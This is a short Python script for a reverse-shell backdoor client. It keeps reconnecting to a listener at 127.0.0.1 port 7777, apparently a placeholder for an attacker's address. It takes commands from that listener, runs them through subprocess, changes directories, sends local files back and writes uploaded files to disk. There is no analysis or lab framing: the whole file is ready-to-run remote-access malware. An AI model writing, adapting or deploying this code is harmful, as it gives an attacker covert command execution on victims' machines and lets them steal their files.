#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os               #It's module for work OS
import time             #It's module for work time
import socket           #It's module for work socket
import subprocess       #It's module for work sys.command

while True:
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('127.0.0.1', 7777))
            break
        except:
            time.sleep(5)
            continue


    def get_data():
        '''It's function for get information from server and decode'''
        data = client.recv(10240).decode()
        data = data.split()
        return data


    def send_data(data):
        '''It's function for send information to server'''
        data = data.encode()
        client.send(data)


    def main():
        '''It's function for call function and data processing'''
        while True:
            command = get_data()
            print(command)
            try:
                if command[0] == 'cd':
                    os.chdir(command[1])
                    send_data('[+] Changed')

                elif command[0] == 'download':
                    with open(command[1], 'rb') as file:
                        content = file.read(2048)
                        client.send(content)
                        time.sleep(1)

                    send_data('ST0P')

                elif command[0] == 'upload':
                    with open(command[1], 'wb') as file:
                        while True:
                            text = client.recv(2048)

                            if text == b'ST0P':
                                break

                            else:
                                file.write(text)

                elif command[0] == 'q':
                    break

                else:
                    information = subprocess.check_output(command).decode()
                    print(information)

                    if information == '':
                        send_data('...')
                    else:
                        send_data(information)

            except:
                send_data('Error(client)')


    if __name__ == '__main__':
        main()
